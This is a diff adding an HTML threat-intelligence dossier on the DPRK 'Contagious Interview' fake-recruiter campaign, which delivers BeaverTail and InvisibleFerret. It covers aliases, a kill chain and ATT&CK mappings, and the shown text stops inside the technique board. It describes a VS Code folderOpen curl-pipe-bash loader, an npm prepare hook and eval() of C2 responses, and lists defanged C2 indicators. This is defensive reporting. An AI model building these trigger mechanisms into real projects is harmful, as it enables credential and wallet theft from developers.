@@ -1,0 +1,922 @@
+<title>Contagious Interview Dossier</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<!-- Self-contained: no external fonts, scripts, or assets. Renders fully offline. -->
+<style>
+  :root{
+    /* native type stacks, zero network dependency (atlas principle) */
+    --f-display:ui-sans-serif,system-ui,-apple-system,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
+    --f-body:system-ui,-apple-system,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
+    --f-mono:ui-monospace,"SF Mono",SFMono-Regular,"Cascadia Code","JetBrains Mono",Menlo,Consolas,"Liberation Mono",monospace;
+    --bg:#f2f4f5; --surface:#ffffff; --surface-2:#eef1f3; --surface-3:#e6eaee;
+    --border:#d3dae0; --border-strong:#b7c2cb;
+    --text:#141a21; --muted:#4c5966; --dimmed:#75828f;
+    --signal:#0e7490; --signal-soft:rgba(8,145,178,.10);
+    --crit:#d21f3c; --high:#c25410; --med:#9a7310; --low:#1f5fbf;
+    --crit-bg:rgba(210,31,60,.09); --high-bg:rgba(194,84,16,.10); --med-bg:rgba(154,115,16,.10); --low-bg:rgba(31,95,191,.10);
+    --code-bg:#0f151d; --code-text:#d3dce6; --code-border:#243040;
+    --shadow:0 1px 2px rgba(20,26,33,.06),0 8px 24px rgba(20,26,33,.06);
+    --maxw:660px;
+  }
+  @media (prefers-color-scheme:dark){
+    :root:not([data-theme="light"]){
+      --bg:#020408; --surface:#0d1117; --surface-2:#161b22; --surface-3:#1e2633;
+      --border:#1e293b; --border-strong:#2d3b4d;
+      --text:#e2e8f0; --muted:#94a3b8; --dimmed:#64748b;
+      --signal:#00F0FF; --signal-soft:rgba(0,240,255,.10);
+      --crit:#FF4D6D; --high:#ff8f4d; --med:#FFD700; --low:#58a6ff;
+      --crit-bg:rgba(255,77,109,.12); --high-bg:rgba(255,143,77,.10); --med-bg:rgba(255,215,0,.10); --low-bg:rgba(88,166,255,.11);
+      --code-bg:#010204; --code-text:#cbd6e2; --code-border:#1e2836;
+      --shadow:0 1px 2px rgba(0,0,0,.4),0 10px 30px rgba(0,0,0,.35);
+    }
+  }
+  :root[data-theme="dark"]{
+    --bg:#020408; --surface:#0d1117; --surface-2:#161b22; --surface-3:#1e2633;
+    --border:#1e293b; --border-strong:#2d3b4d;
+    --text:#e2e8f0; --muted:#94a3b8; --dimmed:#64748b;
+    --signal:#00F0FF; --signal-soft:rgba(0,240,255,.10);
+    --crit:#FF4D6D; --high:#ff8f4d; --med:#FFD700; --low:#58a6ff;
+    --crit-bg:rgba(255,77,109,.12); --high-bg:rgba(255,143,77,.10); --med-bg:rgba(255,215,0,.10); --low-bg:rgba(88,166,255,.11);
+    --code-bg:#010204; --code-text:#cbd6e2; --code-border:#1e2836;
+    --shadow:0 1px 2px rgba(0,0,0,.4),0 10px 30px rgba(0,0,0,.35);
+  }
+
+  *{box-sizing:border-box}
+  html{-webkit-text-size-adjust:100%; overflow-x:clip}
+  body{overflow-x:clip}
+  body{
+    margin:0; background:var(--bg); color:var(--text);
+    font-family:var(--f-body);
+    font-size:16px; line-height:1.6; letter-spacing:.005em;
+    text-rendering:optimizeLegibility; -webkit-font-smoothing:antialiased;
+  }
+  .mono{font-family:var(--f-mono); overflow-wrap:anywhere}
+
+  /* ---- classification bar ---- */
+  .tlp{
+    position:sticky; top:0; z-index:40;
+    display:flex; align-items:center; gap:12px; flex-wrap:wrap;
+    padding:8px 20px; font-family:var(--f-mono); font-size:12px;
+    letter-spacing:.14em; text-transform:uppercase;
+    background:var(--surface); border-bottom:1px solid var(--border);
+    color:var(--muted);
+  }
+  .tlp b{color:var(--text); font-weight:600}
+  .beacon{width:8px; height:8px; border-radius:50%; background:var(--signal);
+    box-shadow:0 0 0 0 var(--signal); animation:pulse 2.6s ease-out infinite}
+  @keyframes pulse{
+    0%{box-shadow:0 0 0 0 var(--signal-soft)}
+    70%{box-shadow:0 0 0 7px transparent}
+    100%{box-shadow:0 0 0 0 transparent}
+  }
+  .tlp .spacer{margin-left:auto}
+  .toggle{
+    font:inherit; font-size:11px; letter-spacing:.1em; cursor:pointer;
+    background:transparent; color:var(--muted); border:1px solid var(--border);
+    border-radius:6px; padding:4px 9px;
+  }
+  .toggle:hover{color:var(--text); border-color:var(--border-strong)}
+
+  /* ---- nav ---- */
+  nav.sections{
+    position:sticky; top:37px; z-index:30;
+    background:color-mix(in srgb,var(--bg) 88%,transparent);
+    backdrop-filter:blur(8px);
+    border-bottom:1px solid var(--border);
+    overflow-x:auto;
+  }
+  nav.sections ul{display:flex; gap:2px; margin:0; padding:6px 16px; list-style:none; min-width:max-content}
+  nav.sections a{
+    font-family:var(--f-mono); font-size:12px; letter-spacing:.02em;
+    color:var(--muted); text-decoration:none; padding:6px 11px; border-radius:6px; white-space:nowrap;
+  }
+  nav.sections a:hover{color:var(--text); background:var(--surface-2)}
+  .nav-toggle{display:none}
+  @media(max-width:640px){
+    nav.sections{overflow:visible}
+    .nav-toggle{display:flex; align-items:center; gap:11px; width:100%; margin:0; cursor:pointer;
+      background:transparent; border:none; padding:11px 16px; text-align:left;
+      font-family:var(--f-mono); font-size:12px; letter-spacing:.12em; text-transform:uppercase; color:var(--muted)}
+    .nav-toggle .bars{display:inline-flex; flex-direction:column; gap:3px; width:18px}
+    .nav-toggle .bars span{height:2px; background:currentColor; border-radius:2px; transition:transform .2s, opacity .2s}
+    .nav-toggle[aria-expanded="true"]{color:var(--signal)}
+    .nav-toggle[aria-expanded="true"] .bars span:nth-child(1){transform:translateY(5px) rotate(45deg)}
+    .nav-toggle[aria-expanded="true"] .bars span:nth-child(2){opacity:0}
+    .nav-toggle[aria-expanded="true"] .bars span:nth-child(3){transform:translateY(-5px) rotate(-45deg)}
+    nav.sections ul{
+      position:absolute; top:100%; left:0; right:0; flex-direction:column; gap:0; min-width:0;
+      background:var(--surface); border-bottom:1px solid var(--border);
+      padding:6px 8px 10px; max-height:76vh; overflow-y:auto;
+      opacity:0; visibility:hidden; transform:translateY(-6px);
+      transition:opacity .2s ease, transform .2s ease, visibility .2s;
+    }
+    nav.sections ul.open{opacity:1; visibility:visible; transform:none}
+    nav.sections li{width:100%}
+    nav.sections a{display:block; padding:11px 12px; font-size:13px; border-radius:8px}
+  }
+  @media(prefers-reduced-motion:reduce){nav.sections ul, .nav-toggle .bars span{transition:none}}
+
+  /* container inner width == the reading measure (--maxw 660 + 2x20 padding),
+     so top-level prose and the full-width boxes/tables all align to one column.
+     Was 940px, which left 660px prose ragged inside a wider shell on desktop. */
+  .wrap{max-width:700px; margin:0 auto; padding:0 20px}
+
+  /* ---- hero ---- */
+  header.hero{padding:56px 0 40px; border-bottom:1px solid var(--border)}
+  .eyebrow{
+    font-family:var(--f-mono); font-size:12.5px; letter-spacing:.22em;
+    text-transform:uppercase; color:var(--signal); margin:0 0 18px;
+  }
+  h1{
+    font-family:var(--f-display); font-weight:800; letter-spacing:-.02em;
+    font-size:clamp(2.1rem,6vw,3.5rem); line-height:1.02; margin:0 0 6px; text-wrap:balance;
+  }
+  .subhead{font-family:var(--f-display); font-weight:600; font-size:clamp(1rem,2.4vw,1.28rem);
+    color:var(--muted); margin:0 0 26px; letter-spacing:-.01em}
+  .metastrip{
+    display:grid; grid-template-columns:repeat(2,1fr); gap:1px;
+    background:var(--border); border:1px solid var(--border); border-radius:10px; overflow:hidden;
+    margin-top:8px;
+  }
+  /* 6 cells: only 2 / 3 / 6 columns divide evenly, so never leave trailing blanks */
+  @media(min-width:560px){.metastrip{grid-template-columns:repeat(3,1fr)}}
+  @media(min-width:860px){.metastrip{grid-template-columns:repeat(6,1fr)}}
+  .metastrip div{background:var(--surface); padding:12px 15px}
+  .metastrip dt{font-family:var(--f-mono); font-size:10.5px; letter-spacing:.13em;
+    text-transform:uppercase; color:var(--dimmed); margin:0 0 4px}
+  .metastrip dd{margin:0; font-weight:600; font-size:14px}
+
+  /* ---- sections ---- */
+  section{padding:44px 0; border-bottom:1px solid var(--border)}
+  .sec-head{display:flex; align-items:baseline; gap:14px; margin:0 0 8px}
+  .sec-num{font-family:var(--f-mono); font-size:13px; font-weight:600;
+    color:var(--signal); letter-spacing:.05em; padding-top:3px}
+  h2{font-family:var(--f-display); font-weight:700; letter-spacing:-.015em;
+    font-size:clamp(1.5rem,3.6vw,2.05rem); line-height:1.1; margin:0; text-wrap:balance}
+  .sec-sub{color:var(--muted); font-size:15px; margin:2px 0 26px; max-width:var(--maxw); text-wrap:pretty}
+  p{max-width:var(--maxw); text-wrap:pretty}
+  h3{font-family:var(--f-display); font-weight:600; font-size:1.12rem; letter-spacing:-.01em;
+    margin:30px 0 10px}
+  h4{font-family:var(--f-mono); font-size:12px; letter-spacing:.12em; text-transform:uppercase;
+    color:var(--dimmed); margin:22px 0 8px; font-weight:600}
+  a{color:var(--signal)}
+  strong{font-weight:600}
+
+  /* BLUF callout */
+  .bluf{
+    border:1px solid color-mix(in srgb,var(--crit) 30%,var(--border));
+    background:var(--crit-bg); border-radius:10px; padding:18px 20px; margin:0 0 26px;
+    max-width:none;
+  }
+  .bluf .tag{font-family:var(--f-mono); font-size:11px; letter-spacing:.14em;
+    text-transform:uppercase; color:var(--crit); font-weight:600; display:block; margin-bottom:6px}
+  .bluf p{max-width:none; margin:0}
+
+  .note{border:1px solid var(--border); background:var(--surface); border-radius:10px;
+    padding:15px 18px; margin:20px 0; font-size:14.5px; color:var(--muted); max-width:none}
+  .note b{color:var(--text)}
+  .note.signal{border-color:color-mix(in srgb,var(--signal) 32%,var(--border))}
+  /* reading measure is for top-level section prose only; reset inside padded cards */
+  .note p, .note ul.plain, .note li{max-width:none}
+
+  /* severity chips */
+  .chip{display:inline-flex; align-items:center; gap:6px; font-family:var(--f-mono);
+    font-size:10.5px; font-weight:600; letter-spacing:.08em; text-transform:uppercase;
+    padding:3px 8px; border-radius:5px; border:1px solid transparent; white-space:nowrap}
+  .chip::before{content:""; width:6px; height:6px; border-radius:50%}
+  .chip.crit{color:var(--crit); background:var(--crit-bg); border-color:color-mix(in srgb,var(--crit) 30%,transparent)}
+  .chip.crit::before{background:var(--crit)}
+  .chip.high{color:var(--high); background:var(--high-bg); border-color:color-mix(in srgb,var(--high) 30%,transparent)}
+  .chip.high::before{background:var(--high)}
+  .chip.med{color:var(--med); background:var(--med-bg); border-color:color-mix(in srgb,var(--med) 30%,transparent)}
+  .chip.med::before{background:var(--med)}
+  .chip.low{color:var(--low); background:var(--low-bg); border-color:color-mix(in srgb,var(--low) 30%,transparent)}
+  .chip.low::before{background:var(--low)}
+  .chip.sig{color:var(--signal); background:var(--signal-soft); border-color:color-mix(in srgb,var(--signal) 32%,transparent)}
+  .chip.sig::before{background:var(--signal)}
+  .chip.neu{color:var(--muted); background:var(--surface-2); border-color:var(--border)}
+  .chip.neu::before{background:var(--dimmed)}
+
+  /* tables */
+  .twrap{overflow-x:auto; margin:18px 0; border:1px solid var(--border); border-radius:10px}
+  table{border-collapse:collapse; width:100%; min-width:560px; font-size:13.5px}
+  thead th{font-family:var(--f-mono); font-size:10.5px; letter-spacing:.1em;
+    text-transform:uppercase; color:var(--dimmed); text-align:left; font-weight:600;
+    padding:11px 14px; background:var(--surface-2); border-bottom:1px solid var(--border); white-space:nowrap}
+  tbody td{padding:11px 14px; border-bottom:1px solid var(--border); vertical-align:top}
+  tbody tr:last-child td{border-bottom:none}
+  tbody tr:nth-child(even) td{background:var(--surface-2)}
+  td .mono{font-size:12.5px; word-break:break-word}
+  .tid{color:var(--signal); font-family:var(--f-mono); font-size:12.5px; white-space:nowrap}
+
+  /* ATT&CK matrix */
+  .matrix{display:grid; grid-template-columns:repeat(auto-fill,minmax(168px,1fr)); gap:12px; margin:20px 0}
+  .col{border:1px solid var(--border); border-radius:10px; background:var(--surface); overflow:hidden}
+  .col > h5{margin:0; font-family:var(--f-mono); font-size:10.5px; letter-spacing:.08em;
+    text-transform:uppercase; color:var(--muted); padding:10px 12px; background:var(--surface-2);
+    border-bottom:1px solid var(--border); font-weight:600}
+  .col ul{list-style:none; margin:0; padding:8px; display:flex; flex-direction:column; gap:6px}
+  .ttp{border:1px solid var(--border); border-radius:7px; padding:7px 9px; background:var(--bg)}
+  .ttp .id{font-family:var(--f-mono); font-size:11px; color:var(--signal); font-weight:600}
+  .ttp .nm{display:block; font-size:12px; color:var(--text); margin-top:2px; line-height:1.35}
+
+  /* code blocks */
+  .codeblock{position:relative; margin:16px 0}
+  .codeblock .bar{display:flex; align-items:center; gap:8px; padding:8px 12px;
+    background:var(--code-border); border:1px solid var(--code-border); border-bottom:none;
+    border-radius:9px 9px 0 0; font-family:var(--f-mono); font-size:11px;
+    letter-spacing:.1em; text-transform:uppercase; color:#8fa2b8}
+  .codeblock .bar .fn{color:#c7d3e0; text-transform:none; letter-spacing:0}
+  .copy{margin-left:auto; font:inherit; font-size:10.5px; letter-spacing:.08em; cursor:pointer;
+    background:transparent; border:1px solid #38485c; color:#9fb0c4; border-radius:5px; padding:3px 8px}
+  .copy:hover{color:#fff; border-color:#5a6f88}
+  pre{margin:0; background:var(--code-bg); color:var(--code-text); border:1px solid var(--code-border);
+    border-radius:0 0 9px 9px; padding:15px 16px; overflow-x:auto; font-family:var(--f-mono);
+    font-size:12.5px; line-height:1.6; tab-size:2}
+  pre.solo{border-radius:9px}
+  .cmt{color:#5f7288}
+  .kw{color:#7cb7ff}
+  .str{color:#7ad39a}
+  .bad{color:#ff8298}
+  code.inl{font-family:var(--f-mono); font-size:.88em; background:var(--surface-2);
+    border:1px solid var(--border); border-radius:4px; padding:1px 5px}
+
+  /* IOC list rows */
+  .ioc{display:grid; grid-template-columns:120px 1fr auto; gap:12px; align-items:center;
+    padding:11px 14px; border:1px solid var(--border); border-radius:8px; margin:8px 0; background:var(--surface)}
+  .ioc .k{font-family:var(--f-mono); font-size:10.5px; letter-spacing:.08em;
+    text-transform:uppercase; color:var(--dimmed)}
+  .ioc .v{font-family:var(--f-mono); font-size:13px; word-break:break-all}
+  @media(max-width:560px){.ioc{grid-template-columns:1fr auto}.ioc .k{grid-column:1/-1}}
+
+  /* runbook steps */
+  ol.steps{counter-reset:s; list-style:none; padding:0; margin:18px 0; max-width:none}
+  ol.steps > li{counter-increment:s; position:relative; padding:16px 18px 16px 56px;
+    border:1px solid var(--border); border-radius:10px; margin:10px 0; background:var(--surface)}
+  ol.steps > li::before{content:counter(s,decimal-leading-zero); position:absolute; left:16px; top:15px;
+    font-family:var(--f-mono); font-size:13px; font-weight:600; color:var(--signal)}
+  ol.steps h4{margin:0 0 5px; color:var(--text); font-family:var(--f-display); font-size:15px;
+    letter-spacing:-.01em; text-transform:none}
+  ol.steps p{margin:0; font-size:14px; color:var(--muted); max-width:none}
+  ol.steps .phase{font-family:var(--f-mono); font-size:10px; letter-spacing:.1em;
+    text-transform:uppercase; color:var(--dimmed)}
+
+  ul.plain{padding-left:0; list-style:none; max-width:var(--maxw)}
+  ul.plain li{position:relative; padding-left:20px; margin:7px 0; font-size:14.5px}
+  ul.plain li::before{content:"▸"; position:absolute; left:0; color:var(--signal); font-size:12px; top:2px}
+
+  footer{padding:40px 0 70px}
+  footer .disc{border:1px solid var(--border); border-radius:10px; padding:18px 20px; background:var(--surface);
+    font-size:13px; color:var(--muted); max-width:none}
+  footer h4{margin-top:0}
+  .srclist{columns:2; column-gap:26px; font-size:13px; margin:12px 0 0}
+  .srclist a{display:block; margin-bottom:7px; break-inside:avoid; word-break:break-word}
+  @media(max-width:600px){.srclist{columns:1}}
+
+  /* ---- ziggurat / altitude control ---- */
+  .altitude{margin-top:26px; border:1px solid var(--border); border-radius:12px;
+    background:var(--surface); padding:16px 18px}
+  .alt-top{display:flex; align-items:center; gap:14px; flex-wrap:wrap}
+  .alt-label{font-family:var(--f-mono); font-size:10.5px; letter-spacing:.16em;
+    text-transform:uppercase; color:var(--dimmed)}
+  .alt-seg{display:inline-flex; border:1px solid var(--border-strong); border-radius:9px; overflow:hidden}
+  .alt-seg button{font:inherit; cursor:pointer; background:var(--surface); color:var(--muted);
+    border:none; border-right:1px solid var(--border); padding:8px 15px; display:flex; flex-direction:column;
+    align-items:flex-start; gap:1px; line-height:1.1}
+  .alt-seg button:last-child{border-right:none}
+  .alt-seg button b{font-family:var(--f-display); font-weight:700; font-size:13.5px; letter-spacing:-.01em}
+  .alt-seg button small{font-family:var(--f-mono); font-size:9.5px; letter-spacing:.1em; text-transform:uppercase; color:var(--dimmed)}
+  .alt-seg button:hover{color:var(--text); background:var(--surface-2)}
+  .alt-seg button[aria-pressed="true"]{background:var(--signal-soft); color:var(--text)}
+  .alt-seg button[aria-pressed="true"] b{color:var(--signal)}
+  .alt-seg button[aria-pressed="true"] small{color:var(--signal)}
+  .alt-hint{margin:12px 0 0; font-size:13px; color:var(--muted); max-width:none}
+  .alt-hint b{color:var(--text); font-weight:600}
+  .zig{display:flex; align-items:flex-end; gap:3px; margin-left:auto}
+  .zig i{display:block; width:13px; background:var(--border-strong); border-radius:2px 2px 0 0}
+  .zig i:nth-child(1){height:9px} .zig i:nth-child(2){height:16px} .zig i:nth-child(3){height:24px}
+  [data-depth="2"] .zig i, [data-depth="1"] .zig i:nth-child(-n+2), [data-depth="0"] .zig i:nth-child(1){background:var(--signal)}
+
+  .stratum{font-family:var(--f-mono); font-size:9.5px; letter-spacing:.1em; text-transform:uppercase;
+    color:var(--dimmed); border:1px solid var(--border); border-radius:5px; padding:2px 7px; margin-left:auto; align-self:center; white-space:nowrap}
+
+  /* depth gating, the ziggurat: hide strata below the chosen altitude */
+  [data-depth="0"] [data-alt="1"], [data-depth="0"] [data-alt="2"], [data-depth="1"] [data-alt="2"]{display:none}
+
+  .kb{font-family:var(--f-mono); color:var(--crit)}
+  .defang{color:var(--muted)}
+  :focus-visible{outline:2px solid var(--signal); outline-offset:2px; border-radius:3px}
+  @media (prefers-reduced-motion:reduce){.beacon{animation:none}*{scroll-behavior:auto}}
+  html{scroll-behavior:smooth}
+  section{scroll-margin-top:86px}
+
+  /* mobile-lock */
+  html,body{overflow-x:clip; overscroll-behavior-y:none}
+  .mono{overflow-wrap:anywhere}
+  footer{margin-bottom:44px}
+</style>
+
+<div class="tlp">
+  <span class="beacon" aria-hidden="true"></span>
+  <span><b>TLP:CLEAR</b> tradecraft · <b>TLP:AMBER</b> specific indicators</span>
+  <span class="defang">◈ Self-contained · offline-ready</span>
+  <span class="spacer"></span>
+  <button class="toggle" id="themeBtn" type="button" aria-label="Toggle color theme">◐ THEME</button>
+</div>
+
+<nav class="sections" aria-label="Sections">
+  <button class="nav-toggle" id="navToggle" type="button" aria-expanded="false" aria-controls="navList" aria-label="Toggle sections menu">
+    <span class="bars" aria-hidden="true"><span></span><span></span><span></span></span>
+    <span>Jump to section</span>
+  </button>
+  <ul id="navList">
+    <li data-alt="0"><a href="#brief">00 · Brief</a></li>
+    <li data-alt="1"><a href="#attribution">01 · Attribution</a></li>
+    <li data-alt="1"><a href="#killchain">02 · Kill Chain</a></li>
+    <li data-alt="1"><a href="#mbom">03 · Malicious BOM</a></li>
+    <li data-alt="2"><a href="#detection">04 · Detection</a></li>
+    <li data-alt="2"><a href="#ir">05 · IR Runbook</a></li>
+    <li data-alt="2"><a href="#walkthrough">06 · Code Walk-through</a></li>
+    <li data-alt="2"><a href="#arcs">07 · ARCS Layer</a></li>
+    <li><a href="#sources">Sources</a></li>
+  </ul>
+</nav>
+
+<div class="wrap">
+
+  <header class="hero">
+    <p class="eyebrow">DPRK · Famous Chollima · MITRE ATT&amp;CK G1052</p>
+    <h1>Contagious Interview</h1>
+    <p class="subhead">A fake-recruiter developer-targeting operation delivering BeaverTail &amp; InvisibleFerret, dissected for detection, response, and awareness.</p>
+    <dl class="metastrip">
+      <div><dt>Threat Actor</dt><dd>Famous Chollima (DPRK cluster)</dd></div>
+      <div><dt>Group ID</dt><dd class="mono">G1052</dd></div>
+      <div><dt>Malware</dt><dd>BeaverTail + InvisibleFerret</dd></div>
+      <div><dt>Motivation</dt><dd>Financial / crypto theft</dd></div>
+      <div><dt>Vector</dt><dd>Trojanized "coding-test" repo</dd></div>
+      <div><dt>Overall severity</dt><dd><span class="chip crit">Critical</span></dd></div>
+    </dl>
+
+    <div class="altitude" role="group" aria-label="Reading altitude">
+      <div class="alt-top">
+        <span class="alt-label">Atlas depth</span>
+        <div class="alt-seg" id="altSeg">
+          <button type="button" data-alt-set="0" aria-pressed="false"><b>Summit</b><small>Exec</small></button>
+          <button type="button" data-alt-set="1" aria-pressed="false"><b>Ridge</b><small>Analyst</small></button>
+          <button type="button" data-alt-set="2" aria-pressed="true"><b>Foundation</b><small>Operator</small></button>
+        </div>
+        <div class="zig" aria-hidden="true"><i></i><i></i><i></i></div>
+      </div>
+      <p class="alt-hint">One file, three strata. <b>Summit</b> is the one-screen executive read; <b>Ridge</b> adds attribution, the kill chain, and the malicious BOM; <b>Foundation</b> unlocks the detections, IR runbook, code walk-through, and the ARCS method layer. Descend to the depth you need, the whole atlas travels in this single, dependency-free page.</p>
+    </div>
+  </header>
+
+  <!-- 00 BRIEF -->
+  <section id="brief" data-alt="0">
+    <div class="sec-head"><span class="sec-num">00</span><h2>Executive brief</h2><span class="stratum">Summit · Exec</span></div>
+    <p class="sec-sub">Bottom line up front, for the responder who has 90 seconds.</p>
+
+    <div class="bluf">
+      <span class="tag">◆ BLUF, act on this first</span>
+      <p>A developer was lured via a fake technical-interview "take-home" and cloned <span class="mono kb">github.com/Cryptense-Eco/Jackpot</span>. <strong>Opening the folder in a trusted editor</strong>, or running <span class="mono">npm install</span>, detonates a JavaScript stealer (<strong>BeaverTail</strong>) that harvests <span class="mono">process.env</span> and browser/wallet secrets, then pulls a Python backdoor (<strong>InvisibleFerret</strong>). If any developer touched this repo, treat their host as compromised: <strong>isolate it, rotate every credential it could reach, and hunt for outbound traffic to port <span class="mono">1224</span></strong>. Details and detections below.</p>
+    </div>
+
+    <h4>What makes this dangerous</h4>
+    <ul class="plain">
+      <li><strong>Auto-run on folder open.</strong> A <span class="mono">.vscode/tasks.json</span> task with <span class="mono">runOn: folderOpen</span> executes a <span class="mono">curl | bash</span> loader when the project is opened in VS Code with the folder <em>trusted</em>. Keeping Workspace Trust enabled (the default) blocks it, which is exactly why the lure insists you "only review, do not run."</li>
+      <li><strong>Belt-and-suspenders execution.</strong> A <span class="mono">package.json</span> <span class="mono">"prepare"</span> lifecycle hook fires the same chain on <span class="mono">npm install</span>, so careful reviewers who avoid VS Code are still caught.</li>
+      <li><strong>Live remote code execution.</strong> The beacon to <span class="mono defang">hxxp://91.121.235[.]127:1224/api/checkStatus</span> <span class="mono">eval()</span>s whatever the server returns, the operator has an interactive shell into the victim's Node process.</li>
+      <li><strong>Secret-first collection.</strong> It exfiltrates <span class="mono">process.env</span> wholesale. API keys, cloud tokens, and <span class="mono">.env</span> contents are the primary prize, alongside browser-stored crypto-wallet material.</li>
+    </ul>
+
+    <div class="note signal"><b>Confidence &amp; provenance.</b> Campaign attribution, malware families, and the port-<span class="mono">1224</span> signature are <b>well-established</b> in public reporting (Unit&nbsp;42, Microsoft, MITRE). The specific repo, committer identity, and infrastructure in this dossier are taken from the incident brief supplied to the analyst and are treated as <b>reported indicators</b>, not independently detonated, no live attacker infrastructure was contacted in producing this document.</div>
+  </section>
+
+  <!-- 01 ATTRIBUTION -->
+  <section id="attribution" data-alt="1">
+    <div class="sec-head"><span class="sec-num">01</span><h2>Attribution &amp; naming</h2><span class="stratum">Ridge · Analyst</span></div>
+    <p class="sec-sub">One operation, many vendor names. Knowing the aliases lets you correlate reporting across tools.</p>
+
+    <p><strong>Contagious Interview</strong> is a DPRK state-aligned campaign that MITRE tracks as group <span class="mono tid">G1052</span>. Its tradecraft overlaps with <strong>Lazarus</strong>, but many analysts track it as a distinct, financially motivated cluster (the one CrowdStrike calls <strong>Famous Chollima</strong>), separate from Lazarus's espionage and destructive operations. The strategic goal is theft of cryptocurrency and credentials to fund the regime. Treat the Lazarus lineage as an analytic judgment, not settled consensus.</p>
+
+    <h4>Reported aliases &amp; overlapping clusters</h4>
+    <div class="twrap">
+      <table>
+        <thead><tr><th>Alias</th><th>Attributing vendor / context</th></tr></thead>
+        <tbody>
+          <tr><td class="mono">Contagious Interview</td><td>Palo Alto Unit 42 (campaign name)</td></tr>
+          <tr><td class="mono">Famous Chollima</td><td>CrowdStrike</td></tr>
+          <tr><td class="mono">DeceptiveDevelopment</td><td>ESET</td></tr>
+          <tr><td class="mono">DEV#POPPER</td><td>Securonix</td></tr>
+          <tr><td class="mono">Tenacious Pungsan</td><td>Datadog Security Labs</td></tr>
+          <tr><td class="mono">PurpleBravo / TAG-121</td><td>Recorded Future / others</td></tr>
+          <tr><td class="mono">UNC5342</td><td>Google / Mandiant</td></tr>
+          <tr><td class="mono">Gwisin Gang</td><td>Additional tracking (unconfirmed equivalence)</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <h4>The social-engineering premise</h4>
+    <p>Operators pose as recruiters or hiring managers on LinkedIn, X, or freelancing platforms, targeting software engineers, heavily in <strong>crypto / web3</strong>. The victim is walked through a plausible interview funnel and handed a "coding assessment," "debug this repo," or "demo app to review" task. Running that project is the payload. The lure exploits professional trust and time pressure ("we need this back before the next round"), which is why even security-aware developers execute the code.</p>
+    <div class="note"><b>Sibling payloads.</b> The same crew rotates a small malware family, not just these two: reporting also ties it to <b>OtterCookie</b> (a related loader/stealer) and to fake front-companies that host the lures. Treat BeaverTail and InvisibleFerret as this incident's members of a broader, shifting set.</div>
+  </section>
+
+  <!-- 02 KILL CHAIN -->
+  <section id="killchain" data-alt="1">
+    <div class="sec-head"><span class="sec-num">02</span><h2>Kill chain &amp; ATT&amp;CK mapping</h2><span class="stratum">Ridge · Analyst</span></div>
+    <p class="sec-sub">Seven stages from LinkedIn message to interactive backdoor, mapped to MITRE ATT&amp;CK techniques.</p>
+
+    <div class="twrap">
+      <table>
+        <thead><tr><th>Stage</th><th>Action</th><th>ATT&amp;CK</th><th>Sev</th></tr></thead>
+        <tbody>
+          <tr><td><strong>1 · Lure</strong></td><td>Fake recruiter (<span class="mono">richardstein692@gmail[.]com</span>) contacts developer; fake interview funnel.</td><td class="tid">T1566.003<br>T1656</td><td><span class="chip low">Low</span></td></tr>
+          <tr><td><strong>2 · Delivery</strong></td><td>Victim clones trojanized repo <span class="mono kb">Cryptense-Eco/Jackpot</span> (supply-chain / masquerade as legit assessment).</td><td class="tid">T1195.001<br>T1204.002</td><td><span class="chip med">Medium</span></td></tr>
+          <tr><td><strong>3 · Trigger</strong></td><td><span class="mono">.vscode/tasks.json</span> <span class="mono">folderOpen</span> task &amp; <span class="mono">package.json</span> <span class="mono">prepare</span> hook auto-execute.</td><td class="tid">T1546<br>T1059.007</td><td><span class="chip crit">Critical</span></td></tr>
+          <tr><td><strong>4 · Stage-1 (BeaverTail)</strong></td><td>Obfuscated JS stealer runs; deobfuscates in memory; reads env + browser stores.</td><td class="tid">T1027<br>T1059.007</td><td><span class="chip crit">Critical</span></td></tr>
+          <tr><td><strong>5 · C2 / RCE</strong></td><td>Beacon to <span class="mono defang">:1224/api/checkStatus</span>; <span class="mono">eval()</span> of server response = live RCE.</td><td class="tid">T1071.001<br>T1105 · T1132</td><td><span class="chip crit">Critical</span></td></tr>
+          <tr><td><strong>6 · Stage-2 (InvisibleFerret)</strong></td><td>Second-stage loader <span class="mono defang">vscode-check-mo4-ten.vercel[.]app</span> delivers Python backdoor.</td><td class="tid">T1059.006<br>T1059.004</td><td><span class="chip crit">Critical</span></td></tr>
+          <tr><td><strong>7 · Collect / Persist / Exfil</strong></td><td>Browser creds &amp; wallets, keylog, often AnyDesk for persistence; exfil over C2.</td><td class="tid">T1555.003 · T1217<br>T1041 · T1219</td><td><span class="chip crit">Critical</span></td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <h3>ATT&amp;CK technique board</h3>
+    <div class="matrix">
+      <div class="col"><h5>Initial Access</h5><ul>
+        <li class="ttp"><span class="id">T1566.003</span><span class="nm">Spearphishing via Service (recruiter DM)</span></li>
+        <li class="ttp"><span class="id">T1195.001</span><span class="nm">Compromise SW Dependencies &amp; Tools</span></li>
+      </ul></div>
+      <div class="col"><h5>Execution</h5><ul>
+        <li class="ttp"><span class="id">T1204.002</span><span class="nm">User Execution: Malicious File</span></li>
+        <li class="ttp"><span class="id">T1059.007</span><span class="nm">JavaScript (BeaverTail)</span></li>
+        <li class="ttp"><span class="id">T1059.006</span><span class="nm">Python (InvisibleFerret)</span></li>
+        <li class="ttp"><span class="id">T1059.004</span><span class="nm">Unix Shell (curl | bash)</span></li>
+      </ul></div>
+      <div class="col"><h5>Persistence</h5><ul>
+        <li class="ttp"><span class="id">T1546</span><span class="nm">Event Triggered Exec (folderOpen)</span></li>
+        <li class="ttp"><span class="id">T1219</span><span class="nm">Remote Access SW (AnyDesk)</span></li>
+      </ul></div>
+      <div class="col"><h5>Defense Evasion</h5><ul>
+        <li class="ttp"><span class="id">T1027</span><span class="nm">Obfuscated Files / Information</span></li>
+        <li class="ttp"><span class="id">T1140</span><span class="nm">Deobfuscate / Decode</span></li>
+        <li class="ttp"><span class="id">T1656</span><span class="nm">Impersonation (fake recruiter)</span></li>
+      </ul></div>
+      <div class="col"><h5>Credential Access</h5><ul>
+        <li class="ttp"><span class="id">T1555.003</span><span class="nm">Credentials from Web Browsers</span></li>
+        <li class="ttp"><span class="id">T1552.001</span><span class="nm">Credentials in Files (.env)</span></li>
+      </ul></div>
+      <div class="col"><h5>Discovery / Collection</h5><ul>
+        <li class="ttp"><span class="id">T1082</span><span class="nm">System Information Discovery</span></li>
+        <li class="ttp"><span class="id">T1217</span><span class="nm">Browser Information Discovery</span></li>
